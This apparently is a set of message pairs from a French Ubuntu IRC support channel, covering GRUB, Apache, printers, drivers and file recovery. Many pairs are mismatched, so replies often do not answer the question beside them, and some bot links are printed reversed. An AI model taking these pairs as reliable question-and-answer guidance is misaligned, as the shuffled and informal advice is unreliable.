dd if=/path/to/image of=/dev/hda1 dd if=/path/to/image of=/dev/hda2 etc je pense tobiasBora non ?	Si je fais ça je vais écraser /dev/hda1 non ???
c'est un peu comme le permis de conduire de la voiture	avec apache, tu peux tres bien autoriser le contenu juste via son ndd et refuser l'ip
"pour une ip mais autoriser son nom de domaine " ca ca n'as pas de sens	hors contexte oui, mais dans ma phrase ça un sens :/
Bonjour, j'aimerais installer ubuntu sur un clé usb silicon power, peut on contourne la sécurité?	quelle sécurité ?
parce que je constate que mon script met plus de temps à se terminer que les autres fois	en tout cas je te conseille fortement de changer le systeme de fichier
j'y pense...	en même temps tu cherches un peu les emmerdes, ton disque dur fait 500 Go et tu le formates en FAT...
/me se sens comme un poisson sur terre	oui, essayes de faire un formatage complet, si ça passe c'est que c'est juste le systeme de fichier, si tu as des trucs genre "I/O Error" qui apparraissent dans le syslog alors ton disque est probablement à jeter
han punaise non pas ça	tu devrais faire une copie integrale de l'ensemble des fichiers et refaire le systeme de fichier pour etre sur
je ne sais donc pas modifier les fichiers qui sont sur mon disque dur, je ne peux pas créer de nouveaux fichier ou les déplacer…	tu as un option sur le point du montage "errors=remount-ro" qui dit en gros : si il y a des erreurs, passer en read-only
Pourquoi ?	#debianfr, ou #debian-fr sur oftc
*viens	non, mais ##freenode-fr pour parler du réseau
non plus, c'est désactivé	même le service caché ?
même le service caché ?	oui
-6697 -ssl	##freenode-fr pour ça
Bonjour je ne peux pas passer par tor pour aller sur freenode.	c'est normal
en fait j'ai suivi les indications sur le site ubuntu référence. j'ai activé le module sans probleme. Mais je n'arrive pas à faire fonctionner le tout. Je crois que cela vient de mon vhost plutot	tu peux nous envoyer la configuration de la vhost sur http://paste.ubuntu.com/ ?
Salut à tous, j'ai un problème pour activer l'url rewriting via htaccess sur apache2 ubuntu. Kkun peut m'aider SVP ?	tu n'arrives pas à activer le module ?
euh, y'a un rapport entre lightdm et la connectivité ?	la connexion/ l'execution de network-manager à l'air de se faire seulement une fois que lightdm est bien affiché
peut être qu'il y a un autre moyen de le faire que de lancer un scipt au boot :)	je teste avec greeter-setup-script plutot que greeter-display-screept ><
mais si tu ne vois pas *du tout* le HDD où que ce soit, ça pue	non, un asus X205TA
(tant qu'a faire, que j'me lance pas dans une manip risqué pour rien)	tu ne peux pas lancer un detect d'un port SATA dans le BIOS ?
tu ne peux pas lancer un detect d'un port SATA dans le BIOS ?	bah en tout cas je vois pas comment
verifie les branchements, essaye sur un autre port sata éventuellement	pc portable
parce que si le dd n'est pas vu par le bios, tu va pas aller bien loin	je peux pas refaire un repartitionnement ? parce que a mon avis il s'est chié ou je sais pas
as tu relié le disque dur à la carte mere ?	avant il y avait windows dessus, mon eleve l'a apparement "jarté" (surement d'une mazniere bien immonde)
par contre il fallait définir l'ordre de boot pour mettre l'UEFI en premier	par contre, si c'est pour faire baisser le ratio signal/bruit du canal en parlant de son cas *perso*  merci de s'abstenir :)
avec une clé USB	ça dépend des constructeurs
par contre désactive le "Secure" Boot	le secure boot est desactivé
tu booteras plus rapidement, le plus souvent	le but étant de le désactiver pendant l'installation, en fait, puis de le réactiver à la fin
1) essaie de le désactiver dans le BIOS	comment ?
ça sent l'EFI	oui, je crois, mais je sais pas quoi faire :]
est ce que ta cléf est correctement installé ?	oui, et j'ai fais le test avec deux clés différentes
de mémoire, doit exister un script greasemonkey qui lit dans un plugin (genre vlc), c'est plus léger	je ne suis pas sous firfox mais sous chrome :S
pour info je tourne sur un vieux Dell optiplex 755	le plugin proprio est assez nase pour les perfs
le truc du fstab, c'est qu'il indique des uuid, et niko propose, /j'imagine,/ de remplacer par le chemin du device	typiquement, je grille un port sata sur la cm, je mets les disques sur un autre port, bah uid ..|..
merci pour les conseil c est tres gentils les gars	euh, ça risque de pas marcher hein
daccord ben ce soir quand je rentre du boulot j irais reconfirmer que le hdd soit a 0 dans le bios	dans /boot/grub/device.map, t'as entre autre: "(hd1) /dev/sdb" ?
!wiki grub ordre demarrage	pour le fstab, c'est normalement des uuid, du coup c'est censé tout seul marcher
pour le fstab, c'est normalement des uuid, du coup c'est censé tout seul marcher	-_-
avec ta cléf, tu mount /, et tu regardes le fichier /etc/fstab	http://doc.ubuntu-fr.org/grub_legacy | http://doc.ubuntu-fr.org/amorcage | http://doc.ubuntu-fr.org/uefi | http://doc.ubuntu-fr.org/reparer_ubuntu
daccord	de mémoire, faut modifier le hd à 0 dans grub
Du. Côté du dossier home dans linux?	t'as quoi comme version ?
!wiki foremost	emetsys/gro.rf-utnubu.cod//:ptth | elosnoc_snoitacilppa_sed_etsil/gro.rf-utnubu.cod//:ptth | etelednutxe/gro.rf-utnubu.cod//:ptth | iugtsomerof/gro.rf-utnubu.cod//:ptth | tsomerof/gro.rf-utnubu.cod//:ptth
lequel de forum ?	http://forum.ubuntu-fr.org/viewforum.php?id=15 ← celui-là
Bonjour, quelqu'un a-t-il réussi à jouer à Diablo 3 en passant par playonlinux ?	Salut ! Si tu n'obtiens pas de réponse, je t'encourage à demander sur le forum, il y a pas mal de gamers quand même.
?	un truc du genre m'est arrivé il y a quelques semaines, le wifi plantait au bout d'un temps aléatoire
je fais tout ce que tu viens de citer	je ne dis pas que ca tourne pas, je dis juste que c'est pas ultra reactif, unity tourne avec 1GB, c'est juste pas reactif
on a compris mais il confond distribution et système d'exploitation	ca depend de ce que tu fais avec, mais xfce avec firefx + libreoffice de lancé en meme temps, c'est juste, avec lxde, ca passe
*système d'exploitation*	oui, on a compris, pas besoin de repetter
va y faire un tour	en plus de cela dans l'onglet additionnal drivers il semblerait que la carte intel ne sois pas reconnue correctement;¨Umknown Device Intel microcode¨ ou quelque chose dans ce genre
Bonjour, je viens d'installer 15.04 64bits sur une machine avec cartes graphiques hybride: geforce g105m, la machine surchauffe constamment, je pense que c'est a cause du pilote nouveau. comment puis je force l'utilisation de la carte intel ?	parfois dans le BIOS/UEFI, tu peux désactiver la carte graphique intégrée, ou celle dédiée.
sorry for that	np ;)
hello HackphiL	Hi! If you wish to chat, you can join #ubuntu-fr-offtopic (you need to be identified). This chan is only dedicated to support in French, no English allowed.
mais dis toujours où sont les logs et je jugerai de la pertinence de ta proposition. ;-)	tu peux jeter un coup d'œil dans /var/log, tout est là.
merci slystone mais, j'aime autant décider moi-me ce dont je me "tapes" ;-)	dans ton /etc/default/grub
hello Kilos	board, tu t'en tapes du défilement du boot au démarrage, t'as accès à tous les logs.
permanente	c'est network-manager
so epic	c'est pas l'endroit pour ça
dans le visudo je vois pas arone (ALL ) bla bla c'est normal ?	groups
info read	la c'est le builtin bash et pas le binaire 'read' de coreutil ;p
pourriez alors me dire ce que signifie "read -a" svp	genre -a ca colle dans un array bash pour bash
oui, mais je test une connexion vpn, je cherche a verifier le dns justement	essaye dig @8.8.8.8 yahoo.fr
Quelqu'un pour m'expliquer pourquoi quant je fais "dig yahoo.fr" ça me donne une réponse de 127.0.1.1?	ben tu as un truc qui te ment
cool.	+1 pour le clavier
infos rassemblées sur http://ubuntu.pastebin.fr/39886	c'est pour toi 'hein'
je peux arrêter avec /etc/init.d/zabbix-server stop mais comment le désactiver au démarrage ?	et tu veux pouvoir continuer à le lancer à la main ou pas ?
Je possède une Ubuntu Server 12.04 et j'urais besoin d'une petite info. j'ai un service qui se lance à chaque démarage de Ubuntu. Comment désactiver ce service ?	ca depend de comment il a été installé lancé, donne plus de precisions
je n'arrive pas à réinstaller ma carte son	aplay -l raconte quelque chose ?
salut	tu bosses tôt ?
je ne parviens pas à faire détecter mon imprimante wifi HP Photosmart 5520 par mon xubunutu. Qui pour un coup d'main svp?	 tu as fait quoi depuis ce midi ?
!wiki imprimantes	http://doc.ubuntu-fr.org/imprimante | http://doc.ubuntu-fr.org/imprimantes_brother | http://doc.ubuntu-fr.org/hplip | http://doc.ubuntu-fr.org/cups | http://doc.ubuntu-fr.org/liste_imprimantes_brother
!wiki palimpsest	http://doc.ubuntu-fr.org/suggestions_ubuntu | http://doc.ubuntu-fr.org/raid_logiciel | http://doc.ubuntu-fr.org/karmic
ça dépasse mes competences ^^	je ne veux rien récupérer... je veux juste installer ubuntu
gparted donne quoi ?	mes partitions sont là.. c'est sûr. Je ne les ai pas supprimés... J'ai réessayé une install y'a genre 30min, le seul truc que j'ai fait c'est... booter sur boot-repair qui m'a généré le diagnostic..
que le mbr ne soit pas présent ok, mais pourquoi tu as pas la liste de tes partitions ?	ce disque est fou...
quand tu boot  que le diagnostique du bios est passé, tu appuies sur la touche "c"	http://paste.ubuntu.com/11549107/
j'ai fait des centaines et des centaines d'install de debian, ubuntu, centos, fedora, et j'ai jamais vu un disque / pc me faire autant *****	donc le retour du fdisk de ton hdd ça donne quoi ?
tu as une partition c'est sdb1 et c'est du fat32	j'ai nettoyé plusieurs fois le MBR et le GPT avec gdisk, à chaque fois avant l'install, le disque me sembl
ça te genere pas une erreur ?	il me dit que le MBR est endommagé...
http://doc.ubuntu-fr.org/boot-repair	il ne me proposait même pas de réparation... (je l'ai lancé y'a 10 min pour générer le log)
¬	oui plusieurs fois...
!wiki boot-repair	http://doc.ubuntu-fr.org/uefi | http://doc.ubuntu-fr.org/installer_windows_7_boot_usb
mon écran se bloque et je dois saisir mon pwd pour reprendre la main :-( Comment supprimer çà svp?	quel bureau tu utilise ?
https://askubuntu.com/questions/177348/how-do-i-disable-the-screensaver-lock	on les trouve où ces options?
ere tlmde	dans les options du systeme
sda1 reste 'busy'	euh, et ça te semble étonnant ?
apres on pourra continuer a avancer	je dois m'absenter et je serai de retour vers 14h30 au plus tard, je te biperai. merci d'avance
c'est le premier	t'es plus là?
Re	c'est quoi l'URI du périphérique?
bon :'(	c'est quoi l'URI du périphérique?
et dans if-up.d	à qui t'adresses-tu?
Je ne connaissais pas	et dans /etc/sysconfig/network-scripts/
Oh	http://localhost:631
000resolvconf  avahi-daemon  ntpdate  wpasupplicant avahi-autoipd  ethtool       upstart	je suis dans cups
il est où cet outil imprimante?	recherche imprimente avec la recherche de logiciel
# interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback	rhaaa le réseau qui est pas gérer pareil sur ubuntu et rhel/fedora ^^
normalement tu lance l'outilsz imprimente, tu lui fait rechercher, il te latrouve et te l'installe	je ne crois pas savoir le faire
je ne crois pas savoir le faire	faut regarder la doc de ton imprimente sur ce coup la
je suis en train de tenter le coup avec cps mais sans succès .	tu as rajouté ton imprémente à ton réseau wifi
mais file moi les infos ;) c'est ptet que la parite émergé de l'iceberg	http://pastebin.com/a1BYmKav Les ifconfig
bah faut pas plutôt demander aux gens qui ont changé ta box ? si tu es en dhcp et que tu te fais attribuer une ip, l'OS suit, y a pas grand chose à faire de ce coté là	je sais ;)
Bah normalement il n'y a rien à faire.	tu es passé de quel opérateur à quel opérateur ?
Thanks	de même pour les liens pastebin ou les vers des pages de forums, y a pas grand monde qui va les lire sans savoir si ca peut les concerner, faut au moins decrire en ume ligne de quoi ca cause
http://pastebin.com/0e2KmdCR	de manière générale, les sondages sur irc sont ignorés, et demander si quelu'un veut aider sur un sujet decris vaguement, c'est un sondage, donc libre à toi de poser la question, mais faut pas s'attendre à des réponses tant qu'on ne décrit pas son problème de manière détaillée … pose directement ta question, si quelqu'un peut/veut répondre, il ou elle le fera
tu le sauras maintenant ;)	: Je connais ce principe mais j'ai du mal à le respecter ^^"
On peut balancer des liens pastebin ici?	c'est tout l'intéret de pastebin ;)
essaie LANG=fr_FR.UTF-8 man man	j'avais aussi installé most et fais : sudo update-alternatives --config pager et choisi le numéro de la ligne que mentionnais most.
qui pour un conseil svp?	avoir les manpages fait pas que ta conf les demandes
Xbuntu	https://doc.ubuntu-fr.org/gnome-screensaver
oui je trouve pas :-( je vois rien dans affichage...	Mickael
avelldiroll ?	j'ai pas grand chose de plus à dire, sauf que je vois pas pourquoi tu aurais installé opencl avant de finir de configurer les driver … et si tu insalles les 331-updates c'est que tu n'as pas installé les drivers recommandés, donc que tu n'as pas donné tous les elements … conclusion: n'ayant pas de boule de cristal, je ne peux pas faire grand chose … et je ne vais pas rester longtemps
Surcouf quand je regarde la TV via Firefox	via Firefox ?
Un des écrans est connecté en VGA, ça peut peut-être influer.	c'est qui "il'?
Bon, ça n'a pas l'air d'avoir changé grand chose.	que donne la commade: lsmod | grep '^nvidia'
Pas d'autre idée ?	j'ai une gtx 760 qui marche tres bien, sur 2 ecrans en 1680*1050 les 2 en DVI, comment as tu installé les drivers nvidia proprietaires?
Une suggestion ?	tu utilises quelle connectique ? en VGA tu auras forcément du bruit
Bonsoir à tous, lorsque je regarde un film sur mon xbunto, l'écran se met en veille, comment changer cela svp ?	avec quel logiciel ?
    printf("Hello world!\n");	genre pastbin.com
Quelqu'un est dispo j'ai un problème avec Code::Blocks...	genre?
!info octopussy	désolé, je fais pas araigné.
désolé, je fais pas araigné.	Merci quand même
http://pastebin.com/6gmfNrbw	à priori, souci de droits: /var/lib/samba/usershares/windows failed. Permission denied
salut, je cherche à paramétrer gufw pour autoriser le sftp, mais je sais pas comment faire... actuellement je bloque tous en entrée et autorise en sortie.	tu es derrière un routeur ou une box ? particulier ou entreprise ?
bonne nuit	pour lightdm c'est ta config qui est morte, fais toi un autre compte à la limite
c'est vraiment sympa	gdm doit surement marcher
Oo t'as été ban pour flood? chaud :o	 $ apt-cache policy lightdm compiz pam-kwallet <= et paste sur http://paste.ubuntu-fr-secours.org
 $ apt-cache policy lightdm compiz pam-kwallet <= et paste sur http://paste.ubuntu-fr-secours.org	je sais pas la derniere, je viens de faire sudo apt get pour els deux
mais outre ça, non je vois pas, ça dépasse ma logique	tu parlais d'un paquet necessaire a lightdm tout à l'heure? tu aurais des détails?
sait-on jamais	tu n'as pas un pb de droit sur ton /home ?
c'est donc ta session qui a un probleme, et ma réponse n'est pas vraiment une réponse, mais un contournement …	beaver
http://pix.toile-libre.org/?img=1433174628.png	je pense que tu dois gérer ça directement dans Compiz pour le coup
par exemple j'ai deux dossiers A et B et je voudrais afficher dans C à la fois le contenu de A puis celui de B	et il se passe quoi si A et B contiennent un fichier avec le même nom?
et il se passe quoi si A et B contiennent un fichier avec le même nom?	c'est A qui gagne ! :D
bon merci, à plus....	sinon y a des plugins odf pour ms_office, ce serait probablement le plus propres, comme ca elle peut enregistrer en .docx à la fin en ayant travaillé en .odt entre temps … mais bon, en general les profs donnent du taf à leurs eleves et pas aux parents d'eleves
ça solution rien	En principe un document on le rends en PDF...
ouais sauf que c'est pour des études et les profs doivent être sur la merdouille de cro$oft	ça l'empêche d'avoir les 2 softs ?
ma sœur à msoffice et ma mère à libreoffice et elles galère à bosser sur le même document, bref la merdouille habituel avec les produit cro$oft	bah incite ta soeur à utiliser libreoffice
bonjour, dans quel format faut-il enregistré les document office pour un compatibilité avec libre office et inversement ?	office ?
la vm ou le container si c'est trop lourd, mais bon autant poser la question aux gens qui gerent les machines	Container type docker ? Faut pas être root pour utilser ce type d'outils ?
Et le chroot j'y pensais mais je croyais qu'il fallait être root pour le faire	franchement, la vm c'est le plus simple ;)
tu peux te creer un chroot ou une vm si tu veux à tout prix utiliser apt	la VM c'est un peu trop lourd...
c'est pas propre du tout mais avec un peu de débrouillardise, ça devrait marcher	C'est justement pour éviter les bidouillages du type "je compile à la main" que je voulais le faire
oui, qui marche comme le bidule accroché à chrome-truc	je dois m'absenter... je lirai tes réponses à mon retour. merci de ton concours @+
si tu en veux, tant mieux, si tu n'en veux pas, tant mieux aussi	aurais-tu un lien efficace en français vers un tuto stp?
tant mieux	Héhé, merci de t'inquièter ;)
aurais-tu un lien efficace en français vers un tuto stp?	un tuto pour faire quoi ?
un tuto pour faire quoi ?	poutr voir comment ça marche et si j'en ai l'usage
"HackphiL | re... quelqu'un peut-il-(elle) me dire que pertinence il y aurait à ce que je conserve gigolo installé sur ma machine svp?" <-- comment veux tu que l'on reponde à ta place à cette question, personne n'est mieux placé que toi pour connaitre tes besoins et usages	alors... que support il y ait!  A quoi sert gigolo?
 *en France	merci de trouver un autre salon pour tenter de faire de l'humour et de garder celui-ci pour le support
   HackphiL :  le gigolotisme est interdit par la loi   ;-)	demande a dodo la saumure
je l'avais vu passé il y a quelques mois ;)	Super merci !
la prochaine fois, nohup est ton amis ;)	Certes mais je suis curieux de savoir si c'est possible
salut tout seul	quel intérêt de conserver le soft gigolo?
https://doc.ubuntu-fr.org/variantes	mort de rire : Variantes à personnalisation religieuse : Ichthux (christianisme), et le lien est celui-ci : http://www.ichthux.com/
c'est pas celui-là que j'ai pris	merci pour ton aide
merci pour ton aide	de rien
http://pastebin.com/JJP7zz1E	t'as bien installé qt5.4 ?
ça arrive une fois sur combien une perte de donnees sur un resize ntfs ? (avec une defragmentation au prealable)	puis encore une fois, on parle de linux mint, je ne répondrai plus m'assurer que c'est bien ubuntu :s
ok.	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
mais j'obtiens ERROR: Encrypted private directory is not setup properly	t'es sûr que c'est ton disque ?
sauvegarde ton /home et reinstalle , ca irra plus vite	c'est ce que je voulais faire, mais impossible d'accéder ,à mon home --> mount: unknown filesystem type 'LVM2_member'
tu n'as pas du effacer que les kernels....	c'est possible
pouvez vous me dire comment je dois operer pour exécuter un fichier binaire issu d'un compilation d'un code source en langue c dans le style du serveur apache qui se lance comme une "thread" :?	tu devrais lire ça
np	le dossier isolinux n'existe pas dans mon install...
Salut :) Quelqu'un sait s'il est possible de retirer le choix "Essayer ou Installer" quand on lance un live USB persistant ? Je voudrais qu'il démarre toujours en mode "essai"	c'est possible, il suffit d'editer la configuration du bootloader de la clé (probablement grub ou syslinux)
Salut, c'est quoi le mieux si on veut se connecter à son serveur depuis plusieurs clients. Partagé la clé privée entre les clients ou ajouté les clés publiques de chaque client au serveur?	pour les machines avec un acces physique peu sur (un smartphone par exemple), il est conseillé de creer une clé specifique (pour pouvoir la revoquer independement des autres)
↑ Fr3d3r1c	je suis sur le salon bash maintenant, je vais donc m'adresser à eux. Merci et bonne journée
?	fais ce que t'as dit nesthib
ok donc pas d'echo entre les parenthèses et pas de | bc	tu as lu ma réponse ?
ça ne semble pas fonctionner	c'est quoi blabla? c'est une commande?
ok je vais faire le test sur un autre baash	y'a quoi dans la variable « date » ?
ça retourne 7	je fais $(echo $time+5 | bc) ?
je recommende Rufus si tu es sous Windows	tu n'aime pas liliusb ?
comment s'appelle l'utilitaire pour créer une clé usb bootable ubuntu ?	il y en a plusieurs: UNetbootin (multi-plate-formes), Rufus (Windows)
Je ne comprend pas bien ta question Elfix…	édite le fichier /etc/apache2/mods-available/php5.conf
s'il est actif il devrait lire le fichier non au lieu de me mettre ce message ?	es-tu sûr que tu ouvres la bonne page ? pas un truc par défaut ?
!paste	http://127.0.0.1/~lio/
à mes yeux ça ressemble à ça, apres pour avoir une véritable réponse, il faudrait un message d'erreur en bon uniforme et croiser les doigts qu'il soit verbeux :)	Re :) Je n'ai pas de soucis de ce type avec Compiz
peut être que ton gpu surchauffe NeuhNeuh ?	Bah j'ai pas de soucis hors KDE
beaver c'est pour Hello dans ff, skype j'utilse pas c'est pour faire le test. La cam est vue localement par camorama mais elle ne veut pas aller en ligne semble-t-il	outre check dans les parametres je vois pas ce que tu peux faire … le kernel detecte ta webcam
Elle n'est pas vue depuis Internet	c'est un logiciel privateur, check dans les preferences de ce dernier peut être
en fait, on ne comprend pas son problème	il a installé un LAMP en local sur son PC et a foutu son appli dans /var/www/html
surtout si elle marche, à part avec "cpasbien"	pour avoir accès aux informations, pardi
pour avoir accès aux informations, pardi	Hernou dispose d'une appli PHP qui permet de RSSifié un site Web qui ne dispose pas de flux RSS
quoi ça veux dire que belgacom veux pas que j'ai une ip publique ?	faut voir avec leurs conditions générales
:D	salaud ;-)
salaud ;-)	collecteur de la NSA !
!paste	t'es chez Free ?
han	grilled
SurcouF ouaip dsl, ifconfig alors	ifconfig est obsolète
comment je mount ma partition sur mon serveur svp ?	ifconfig est déprécié
lol	c'est une adresse IP privée
http://192.168.1.6/rssfeed/index.php	pas mieux
chiotte on y accède comment à mon ip déjà ? :p	raté
dans cmd	on n'est pas sous Windows
ip addr show	too long
okok	donc, il faut pouvoir y accéder depuis l'extérieur
et je ne comprend pas pourquoi	avant d'en penser quoi que ce soit, c'est hors charte freenode
/usr/lib/apache2/modules/mod_userdir.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=715d352d35af260b39c2d03b554b30308ecf6107, stripped	ok, merci
avec 2 pauv'acl	car c'est un module binaire quand même, et que Apache ne sait pas charger à chaud : # file /usr/lib/apache2/modules/mod_userdir.so
https://github.com/sebsauvage/rss-bridge/issues/131	et SurcouF te demande d'expliquer ton probleme depuis le debut plutot que de linker une discussion
dans ~/.cache le dossier existe déjà pas…	on ne comprends pas ton problème, en fait
avelldiroll le débat n'est pas la ca change pas grand chose	navré je ne savais que tu dictais les sujets authorisés ici
et tu accéderas à cela via http://localhost/~toi/	un reload doit suffire, non ?
un reload doit suffire, non ?	a2enmod dit restart en tout cas :)
attend attend une seconde	qu'est-ce que tu entends par « en local » ?
alors là Oleti je pige plus rien	sudo a2enmod userdir && sudo service apache2 restart
parce que ça serait vraiment super top…	~/public_html ?
ça s'ouvre pas avec firefox…	de quoi parles-tu ?
sinon, je vois pas en quoi y'aurait un souci avec du ext	Alors : "Pourquoi les types de système de fichier sont-il précisés dans le post ?"
Alors : "Pourquoi les types de système de fichier sont-il précisés dans le post ?"	j'imagine que c'est parce que l'auteur à vérifié que ça fonctionnait dans ces conditions
j'imagine que c'est parce que l'auteur à vérifié que ça fonctionnait dans ces conditions	D'accord, merci de ta reponse
pas*	Le problème c'est que je n'ai aucun espace de sauvegarde qui correspond aux types spécifiés dans le post. En d'autres termes, puis-je poursuivre le HOWTO, sans avoir à aller acheter un nouveau disque dur externe et le formater en NTFS ?
Que puis-je faire si le système de fichiers de mon disque dur externe est ext3 ?	c'est quoi le souci ? à ce que tu décris, j'en vois as
ok ^^ faut pas non plus que j'abuse la dessus alors^^ je vais essayer grub customizer @papy	j'ai testé cette distribution il y a quelque temps, mais c'est trop "ciblé" pour ce que je fais
j'ai testé cette distribution il y a quelque temps, mais c'est trop "ciblé" pour ce que je fais	merci de tes conseils je vais maintenant modifier grub
est ce que qqun utilise ubuntu studio ici?	manipuler le grub en ligne de commande ça va être coton :-/  il y a surement des choses plus sympa à faire pour apprendre les commandes :-)
qqun peut m'aider?	je viens d'ailleurs de l'installer sur une machine il a à peine 15 mn :-)
bonjour, je suis nouveau sur ubuntu studio et j'aimerais changer l'ordre de boot sur grub. je ne suis pas a l'aise avec les lignes de commande (je suis novice sur linux, mais demande a apprendre...)	bonjour. pour modifier lemenu du grub, je conseille "grub-customizer"
avec ext4	rm -f répertoire/ ne marche pas... qu'as tu tapé ?
rm -f répertoire/ ne marche pas... qu'as tu tapé ?	rm -rf ... ^^'
testdisk marche plutot bien mais c'est long	tu as une boule de cristal qui te donne l quantité de travail necessaire pour tout refaire? … classe …
les données sont vites reecrites sur du ext	c'est le genre d'outil qui scanne ton système pendant deux jours et qui après ne respecte plus l'arborescence ?
c'est le genre d'outil qui scanne ton système pendant deux jours et qui après ne respecte plus l'arborescence ?	pas necessairement, tu peux restreinde des chemins
pas necessairement, tu peux restreinde des chemins	Ah c'est possible de lui dire "seulement dans ce dossier ?"
2 jours de boulot pour rien	ca depend surtout de ton FS
ca depend surtout de ton FS	LVM
LVM	et ensuite c'est le temps pour photorec (tesdisk) et foremost (y en a d'autres)
Ohhhhhhhhhhhh mer** :'(	il n'y a pas de corbeille avec rm
y'as plus grand monde qui cause	un chatterbot devrait accueillir le visiteur de chatterbots.fr
c'est assez affolant, tu te demandes s'il ne remplace pas tout l'os a chaque fois	pense aux màj android, ça télécharge un(des ?) paquet de données (et linux n'est pas en reste suivant les distros)
de tte façon tes gosses et tes colocs ne jurent que par windows donc tu es tranquille , ils ne toucheront pas ton pc	créer un compte pour chaque enfant, la coloc ?
créer un compte pour chaque enfant, la coloc ?	 je parlais à jluc
ouaip	1) Tout est dans ton ~/.local/share/Trash/, tu peux rm -rf 2) ya trash-cli sinon, qui gère le tracking/restore des fichiers de ce dossier
1) Tout est dans ton ~/.local/share/Trash/, tu peux rm -rf 2) ya trash-cli sinon, qui gère le tracking/restore des fichiers de ce dossier	 je vais essayer de traduire
si quelqu'un a une idée	suggestion : ne pas vider la corbeille aussi souvent. La gêne diminuera proportionnellement.
personne ?	je sais pas ;)
c'est toujours pareil	?
je pense que c'est posté mais je ne suis pas sûr	recupère les derniers numéro de la page
je ne vois qpas ce que vous voulez dire, dans le terminal il y a enorméménet de choses inscrites donc que doisje recopier?	 dmesg > mondmsg
je tape les dernier éléments indiqués en ligne de commande? (désolé je suis un peu novice en commandes)	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Et ce n'est pas possible par mail? ou skype?	on peut voir ton kern.log ?
sachant qu'il s'agit d'un pc portable avec wifi intégré	je t'aurais bien aidé mais niko ici présent m'a banni, donc j'ai pas le droit de t'aider.
https://developer.apple.com/library/mac/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html	c'est pas le lieu, si tu lis le /topic, tu verras que c'est un salon de support, pour le reste un salon est indiqué dans le /topic
bon en tous cas merci pour ton aide, j'essaierai de trouver un bouquin pour les nuls	c'est payant, les livres ;-)
c'est sur	il faut admettre qu'il y a une étape à passer
oulà	à accueillier les fichiers temporaires
y a pas une chaîne youtube d'un gars qui expliquerai ça avec des mots pour attardés mentaux dont je fais partie ?	en gros, si tu n'es pas déjà propriétaire d'un fichier sous /tmp, malgré les droits pour tous, tu ne pourras pas le supprimer
c'est quoi -t	le seul répertoire a en avoir un est /tmp
je vais déjà reset les anciens droits	-print0 affiche le résultat mais sans de retour à la ligne
mpm, connais pas	-print affiche le résultat de la commande find et xargs la passe comme argument à la commande chmod
je sais pas ce que c'est print0 | xargs -0	après, tu peux également regarder du côté des autres MPM apache2 pour isoler tes différentes applications en les exécutant avec un utilisateur particulier
car le root de toute façon, il peut aller partout	il faut faire la commande inverse
j'avais fais ces opérations : http://paste.ubuntu.com/11397073/	tu es certain de la syntaxe de ton chmod ?
d'utilisateur	peux-tu être plus précis sur ce que tu as modifié ?
c'est à dire leur redonner les permissions qu'ils ont de base lors d'une installation fraiche	oui mais de quoi parles-tu ? de fichiers ?
quelqu'un saitil comment on enmpêche la corbeille de s'ouvrir sur unity à chaque fois qu'on veut la vider ?	ben chez moi la corbeille est en bas de la barre verticale… clic droit… vider
et si tu cherches des infos sur un sources.list pour Debian, ce n'est pas le bon salon	bjr, j'ai du mal à voir quoi est quoi dans la config et je voudrai mieux comprendre
non, mais un grep #linux-fr ne marche pas alors que grep '#linux-fr' fonctionne	# marque le début d'un commentaire
Bonjour, que représente le caractère # dans le shell ?	généralement le # désigne un shell superutilisateur
Comment se servir de wine efficacement ?	en apprenant à s'en servir doucement sur des cas simples, mais wine ca sert à faire tourner des logiciel proprio pour d'autres OS, et ca sort du cadre de ce salon, y a des salons dediés à wine, et surtout, comme ce sont des applis proprio, le support est à la charge de l'editeur du logiciel proprio
(ca marche pas mal avec du vmware et les bonnes licences ... /troll)	en dediant des cartes graphiques à 100% à une VM, j'appelle pas ca de la virtu
Merci pour l'éclaircissement, une autre question pour quoi une machine virtuelle a de grosse perte de performance ? Seulement à cause du sytème d'exploitation principale ou es-ce plus compliqué ?	ca depend de plein de facteurs, et une VM n'a pas forcement de pertes de perf, tout depend de comment elle est configurée et à quoi elle sert
je sais qu'elle est censé envoyer un message ou une commande à minecraft	C’est moi.
le fait est que les sources de webkit sont dispo et dejà packagées donc y a aucun interet à refaire le taf, vaut mieux le reutiliser, ensuite je ne vois pas l'interet de contribuer à un projet pas libre, mais c'est une question de choix, chacun voit midi à sa porte	le logiciel pour lequel je contribue, est officiellement, sous licence GPLv2
je dois faire -u root alors ?	dans le cas de sudo, -u sert à preciser au nom de quel utilisateur tu veux exxecuter la commande, man sudo pour les details
je ne sais pas ce que c'est -u	si si
j'ai pas le choix de toute maniere, comme tu le stipules plus haut	mais tu fais ce que tu veux, ca veut aussi dire que je fais ce que je veux
mais bon, packager du binaire, surtout quand le code de webkit est dispo, c'est pas une bonne idée	mais ça reste possible à faire, au détriment de la qualité du paquet, dans mon cas précis, c'est la commande lintian qui "chouine" comme t'as sûrement pu le constater hier via mes écrits, et via le .txt que j'ai paste sur le offtopic, (du moins si t'as lu), la logitheque d'ubuntu ne dit strictement rien
si tu peux "analyser" le .zip que le site propose, j'ai juste ce .zip pour faire mon .deb.	un zip, contenant du code compilable ou un executable n'a rien à faire dans un paquet, au risque de me repetter, le packaging ca commence par "lire la debian-policy"
euh le packaging, ca ne se fait pas magiquement, hein	en parlant de ça, c'est une bonne nouvelle ou pas pour toi ? http://www.redhat.com/en/about/blog/taking-stand-against-container-fragmentationwith-standards
en parlant de ça, c'est une bonne nouvelle ou pas pour toi ? http://www.redhat.com/en/about/blog/taking-stand-against-container-fragmentationwith-standards	quelle surpise, redhat propose ce qu'ils utilisent comme standard, que je suis surpris
aucun makefile ou que sais je	webkit en zip n'a rien à faire dans ton paquet
nstaller de logiciel propriétaire. chpo dans le cahier des charges je rajouterais simple et en quelques clic (pas de ligne de code). Merci white_bear je pars pour installer tightvnc  à moins que quelqu'un ait une autre remarque pertinente à faire ?	"tout le monde comprends ce que ca veut dire derrière", justement, non, y a que toi qui comprends ce que tu mets derriere, personne peut le savoir à ta place
ok lequel vous me conseillez du coup le  "meilleur" pour vous  ?	tightvnc en alternative à teamviewer
ça a l'air d'etre plus proche d'un vnc que de ssh ceci dit non ?	ssh repond a son cahier des charges qui est :"je voudrais pouvoir accéder à mon ordinateur maison  de l'extérieur à tout moment."
